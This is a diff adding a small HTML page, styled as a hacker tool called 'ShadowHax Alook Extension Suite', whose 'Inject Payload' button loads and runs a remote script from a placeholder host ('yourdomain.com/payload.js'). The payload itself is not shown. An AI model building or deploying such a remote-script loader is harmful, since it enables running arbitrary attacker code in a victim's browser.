@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>ShadowHax Alook Suite</title>
+  <style>
+    body { background:#111;color:#0f0;font-family:monospace;padding:20px; }
+    button { background:#222;color:#0f0;border:1px solid #0f0;padding:10px;margin:5px; }
+    pre { background:#000;padding:10px;border:1px solid #0f0;overflow:auto;max-height:300px; }
+  </style>
+</head>
+<body>
+  <h2>👾 ShadowHax Alook Extension Suite</h2>
+  <button onclick="inject()">💉 Inject Payload</button>
+  <pre id="console">[+] Ready...</pre>
+
+  <script>
+    function inject(){
+      let s = document.createElement('script');
+      s.src = 'https://yourdomain.com/payload.js'; // <- Host this file
+      document.body.appendChild(s);
+      document.getElementById('console').textContent += '\n[+] Payload.js Injected!';
+    }
+  </script>
+</body>
+</html>
